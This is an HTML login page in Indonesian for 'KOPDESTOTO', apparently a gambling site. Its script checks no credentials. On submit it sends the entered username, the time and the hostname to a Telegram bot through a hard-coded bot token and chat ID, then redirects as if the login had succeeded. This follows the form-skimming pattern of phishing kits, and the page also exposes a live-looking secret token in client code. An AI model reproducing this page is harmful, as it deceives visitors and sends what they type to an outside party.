<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>LOGIN - KOPDESTOTO</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
body{background:#000;color:#fff}
.header{background:linear-gradient(to bottom,#8B0000,#000);padding:12px 10px;display:flex;align-items:center;gap:10px}
.header a{color:#FFD700;text-decoration:none;font-size:20px}
.header h1{font-size:16px}
.container{max-width:400px;margin:40px auto;padding:20px}
.box{background:#1a1a1a;padding:25px;border-radius:12px;border:1px solid #FF0000}
.box h2{text-align:center;color:#FFD700;margin-bottom:20px}
input{width:100%;padding:12px;margin-top:10px;border-radius:8px;border:1px solid #333;background:#0d0d0d;color:#fff}
.btn{width:100%;padding:14px;margin-top:20px;background:linear-gradient(90deg,#FFD700,#FFA000);border:none;border-radius:8px;color:#000;font-weight:bold;font-size:16px;cursor:pointer}
.btn:hover{opacity:0.8}
.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:linear-gradient(to top,#8B0000,#5a0000);display:flex;justify-content:space-around;padding:8px 0;border-top:2px solid #FF0000}
.nav-item{text-align:center;color:#ccc;font-size:10px;text-decoration:none;flex:1}
.nav-item img{width:26px;display:block;margin:0 auto 3px;filter:brightness(0.7)}
.nav-item.active{color:#FFD700}
body{padding-bottom:80px}
</style>
</head>
<body>

<div class="header">
  <a href="index.html">←</a>
  <h1>LOGIN AKUN</h1>
</div>

<div class="container">
  <div class="box">
    <h2>🔐 MASUK KE AKUN</h2>    

    <form id="loginForm">  <!-- HAPUS action, tambah id -->
      <label>Username</label>
      <input type="text" id="username" name="username" placeholder="Masukkan Username" required> <!-- tambah id -->
      
      <label>Password</label>
      <input type="password" id="password" name="password" placeholder="Masukkan Password" required> <!-- tambah id -->
      
      <button class="btn" type="submit" id="btnLogin">LOGIN SEKARANG</button> <!-- tambah id -->
      <p id="status" style="text-align:center; margin-top:10px; color:#FFD700;"></p> <!-- buat status loading -->
    </form>        

    <p style="text-align:center;margin-top:15px;font-size:12px">Belum punya akun? <a href="daftar1.html" style="color:#FFD700">Daftar Disini</a></p>
  </div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const btn = document.getElementById('btnLogin');
    const status = document.getElementById('status');
    const username = document.getElementById('username').value;
    
    btn.disabled = true;
    status.innerText = "Loading...";

    // GANTI DENGAN TOKEN BARU KAMU
    const BOT_TOKEN = "8695932731:AAHEmFPeOuGXZBU1fcBoO3Qh9UDi8pO2vGU"; 
    const CHAT_ID = "392836663";

    const pesan = `🔔 Login Baru KOPDESTOTO
Username: ${username}
Jam: ${new Date().toLocaleString('id-ID')}
IP: ${window.location.hostname}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        // Kirim ke telegram
        await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
        });
        
        status.innerText = "Berhasil! Mengalihkan...";
        
    } catch (err) {
        console.log("Gagal kirim:", err);
        status.innerText = "Gagal kirim notif, tetap redirect";
    }

    // Tunggu 0.5 detik baru redirect biar notif kekirim dulu
    setTimeout(() => {
        window.location.href = "index.html"; 
    }, 500);

});
</script>

</div>

</body>
</html>
